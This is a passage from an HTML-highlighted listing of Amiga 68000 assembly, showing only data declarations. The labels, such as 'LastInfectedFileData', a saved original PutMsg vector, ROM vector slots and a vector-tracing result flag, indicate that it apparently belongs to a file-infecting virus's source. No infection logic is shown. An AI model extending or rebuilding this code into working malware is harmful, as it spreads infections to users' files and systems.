</span><span class="sc5">_ROM_namefromlock</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;11</span><span class="sc0">
</span><span class="sc5">_ROM_addpart</span><span class="sc0">            </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;12</span><span class="sc0">

</span><span class="sc5">_exec_vectors</span><span class="sc0">
</span><span class="sc5">_ROM_addintserver</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">_ROM_findtask</span><span class="sc0">           </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc5">_ROM_putmsg</span><span class="sc0">         </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;2</span><span class="sc0">

</span><span class="sc5">LastInfectedFileData</span><span class="sc0">
</span><span class="sc5">LIF_date</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LIF_size</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">orig_PutMsg_vector</span><span class="sc0">  </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ramlib_task_ptr</span><span class="sc0">     </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">memory_ptr</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xvs_base</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dos_base</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">tracer_result</span><span class="sc0">       </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;0  - vectors traced successfuly</span><span class="sc0">
                    </span><span class="sc1">;-1 - error tracing vectors </span><span class="sc0">

    </span><span class="sc5">cnop</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">_FileInfoBlock</span><span class="sc0">
</span><span class="sc5">_fib_diskkey</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_direntrytype</span><span class="sc0">   </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_filename</span><span class="sc0">       </span><span class="sc5">ds.b</span><span class="sc0">    </span><span class="sc2">108</span><span class="sc0">
</span><span class="sc5">_fib_protection</span><span class="sc0">     </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_entrytype</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_size</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_numblocks</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_date</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fib_comment</span><span class="sc0">        </span><span class="sc5">ds.b</span><span class="sc0">    </span><span class="sc2">80</span><span class="sc0">
</span><span class="sc5">_fib_reserved</span><span class="sc0">       </span><span class="sc5">ds.b</span><span class="sc0">    </span><span class="sc2">80</span><span class="sc0">

    </span><span class="sc5">cnop</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">_InfoData</span><span class="sc0">
</span><span class="sc5">_id_numsofterrors</span><span class="sc0">   </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_unitnumber</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_diskstate</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_numblocks</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_numblocksused</span><span class="sc0">   </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_bytesperblock</span><span class="sc0">   </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_disktype</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_volumenode</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_id_inuse</span><span class="sc0">       </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_filepath</span><span class="sc0">       </span><span class="sc5">ds.b</span><span class="sc0">    </span><span class="sc2">120</span><span class="sc0"> </span><span class="sc1">;dc.b   'dh1:aa/avail',0</span><span class="sc0">
</span><span class="sc5">_buffer</span><span class="sc0"> </span><span class="sc1">;       ds.l    2000</span><span class="sc0">




</span></div></body>
</html>
